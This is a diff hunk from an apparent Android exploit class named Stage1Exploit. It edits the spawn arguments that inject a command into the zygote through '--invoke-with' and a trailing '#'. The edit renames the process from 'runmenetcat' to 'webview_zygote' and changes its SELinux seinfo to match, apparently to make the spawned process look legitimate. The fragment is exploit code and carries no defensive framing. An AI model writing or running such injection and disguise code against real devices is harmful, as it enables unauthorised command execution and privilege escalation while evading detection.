@@ -191,10 +191,10 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform",
+            "--seinfo=webview_zygote",
             "--target-sdk-version=28",
             "--runtime-flags=1",
-            "--nice-name=runmenetcat",
+            "--nice-name=webview_zygote",
             "--invoke-with",
             f"{command}#",
         ]
